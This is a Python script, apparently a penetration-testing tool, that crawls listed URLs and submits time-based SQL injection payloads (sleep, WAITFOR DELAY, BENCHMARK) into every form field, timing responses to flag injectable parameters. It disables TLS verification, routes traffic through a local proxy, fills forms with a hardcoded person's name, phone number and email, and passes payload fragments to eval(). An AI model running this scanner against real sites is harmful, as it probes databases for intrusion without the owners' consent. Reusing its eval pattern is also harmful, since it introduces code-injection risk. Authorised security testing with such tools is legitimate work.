#!/usr/bin/env python3
import os
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
import time
from termcolor import colored
import warnings
import threading
import argparse
import re
import urllib.parse
from alive_progress import alive_bar

# Global definition of default values
default_values = {
    'username': 'NerminKahrimanovic',
    'password': 'NerminKahrimanovic',
    'name': 'NerminKahrimanovic',
    'surname': 'NerminKahrimanovic',
    'phone_number': '38761324271',
    'city': 'NerminKahrimanovic',
    'email': 'ibrahimnerminnnb@gmail.com',
    'first_name': 'Nermin',
    'last_name': 'Kahrimanovic',
    'job_role': 'Software Developer',
    'company_name': 'NerminCorp'
}

# Load payloads from file
with open('time-sql_payloads.txt', 'r') as file:
    payloads = [line.strip() for line in file.readlines()]

# Function to convert time string to seconds
def convert_to_seconds(time_str):
    parts = time_str.split(':')
    if len(parts) == 3:
        return int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
    elif len(parts) == 2:
        return int(parts[0]) * 60 + int(parts[1])
    else:
        # Attempt to decode URL encoded string
        try:
            decoded_str = urllib.parse.unquote(time_str)
            parts = decoded_str.split(':')
            if len(parts) == 3:
                return int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
            elif len(parts) == 2:
                return int(parts[0]) * 60 + int(parts[1])
            else:
                return int(parts[0])
        except ValueError:
            print(colored(f"Invalid time format: {time_str}", "red"))
            return None

# Function to scan a single URL
def scan_url_form(url, total_requests, bar=None):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    warnings.filterwarnings("ignore", category=UserWarning, module="bs4")

    os.environ['http_proxy'] = 'http://127.0.0.1:8080'
    os.environ['https_proxy'] = 'http://127.0.0.1:8080'

    session = requests.Session()
    session.proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate'
    }

    response = session.get(url, verify=False)
    soup = BeautifulSoup(response.text, 'lxml')
    form = soup.find('form')

    if form:
        form_parameters = [input_field.get('name') for input_field in form.find_all('input', {'type': ['text', 'password', 'email', 'number']})]
        form_parameters.extend([textarea['name'] for textarea in form.find_all('textarea')])
        form_parameters.extend([select['name'] for select in form.find_all('select')])

        if form_parameters:
            print(colored("Found the following parameters in the form:", "red"), colored(', '.join(form_parameters), "red"))

        for param in form_parameters:
            with alive_bar(len(payloads), title="Payloads", bar='classic') as bar:
                for payload in payloads:
                    data = {key: default_values.get(key, '') for key in form_parameters}
                    data[param] = payload

                    start_time = time.time()
                    new_response = session.post(url, data=data, headers=headers, verify=False)
                    end_time = time.time()
                    response_time = end_time - start_time

                    # Extract sleep time from payload
                    sleep_time_match = re.search(r'sleep\s*\(\s*(\d+|\d+\s*[*]\s*\d+)\s*\)', payload, re.IGNORECASE)
                    if sleep_time_match:
                        sleep_time = eval(sleep_time_match.group(1))
                        print(colored(f"Extracted sleep time from payload: {sleep_time} seconds", "yellow"))
                    elif 'waitfor delay' in payload.lower():
                        waitfor_delay_match = re.search(r"waitfor\s+delay\s+'?(\d+:\d+:\d+)'?", payload.lower())
                        if waitfor_delay_match:
                            delay_str = waitfor_delay_match.group(1)
                            sleep_time = convert_to_seconds(delay_str)
                            print(colored(f"Extracted sleep time from payload: {sleep_time} seconds", "yellow"))
                    elif 'benchmark' in payload.lower():
                        benchmark_match = re.search(r'benchmark\s*\(\s*(\d+)\s*,', payload, re.IGNORECASE)
                        if benchmark_match:
                            sleep_time = int(benchmark_match.group(1))
                            print(colored(f"Extracted sleep time from payload: {sleep_time} seconds", "yellow"))
                    else:
                        # Decode payload and check if it contains sleep
                        decoded_payload = urllib.parse.unquote(payload)
                        sleep_match = re.search(r'sleep\s*\(\s*(\d+|\d+\s*[*]\s*\d+)\s*\)', decoded_payload, re.IGNORECASE)
                        if sleep_match:
                            sleep_time = eval(sleep_match.group(1))
                            print(colored(f"Extracted sleep time from payload: {sleep_time} seconds", "yellow"))
                        else:
                            # Handle other patterns that indicate delay
                            delay_match = re.search(r"(?:(?:(?:(?:%27)|')%20delay|(?:(?:%22)|\")%20waitfor%20delay|%20WAITFOR%20DELAY|%3B%20WAITFOR%20DELAY|%252520waitfor%252520delay%252520|%3A%20WAITFOR%20DELAY|waitfor%20delay|WAITFOR%20DELAY)\s*'([^']+)'|%20'([^']+)'%20--)", decoded_payload.lower())
                            if delay_match:
                                delay_str = delay_match.group(1) or delay_match.group(2)
                                sleep_time = convert_to_seconds(delay_str)
                                print(colored(f"Extracted sleep time from payload: {sleep_time} seconds", "yellow"))
                            else:
                                print(colored(f"Skipping payload without sleep time: {payload}.", "yellow"))
                                continue

                    if response_time >= 3 and response_time >= (sleep_time - 3) and response_time <= (sleep_time + 3):
                        # Print the detection message in white color
                        print(colored("Time-based SQL Injection FOUND on:", "white"))
                        output = f"URL: {url}\nPARAMETER: {param}\nPAYLOAD: {payload}\nTIME DELAY: {response_time} seconds\n"
                        print(colored(output, "blue"))
                        with open('vulnerable_parameters.txt', 'a') as file:
                            file.write("Time-based SQL Injection FOUND on:\n" + output)
                    else:
                        print(colored(f"Response time: {response_time} seconds", "white"))
                        print(colored("Payload format recognized but sleep time comparison failed.", "yellow"))
                    if bar:
                        bar()

        else:
            print("No form parameters found in the form.")
    else:
        print("No form found in the response body.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Scan URLs for SQL injection vulnerabilities.')
    parser.add_argument('-f', '--fast', action='store_true', help='Enable fast scanning with multithreading.')
    args = parser.parse_args()

    with open('urls.txt', 'r') as file:
        urls = file.readlines()

    urls = [url.strip() for url in urls]
    total_requests = len(urls) * len(payloads) * len(default_values)  # Adjust as necessary

    if args.fast:
        threads = []
        for url in urls:
            t = threading.Thread(target=scan_url_form, args=(url, total_requests))
            threads.append(t)
            t.start()

            if len(threads) >= 10:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()
    else:
        for i, url in enumerate(urls):
            print(f"Scanning URL {i+1}/{len(urls)}: {url}")
            scan_url_form(url, total_requests)
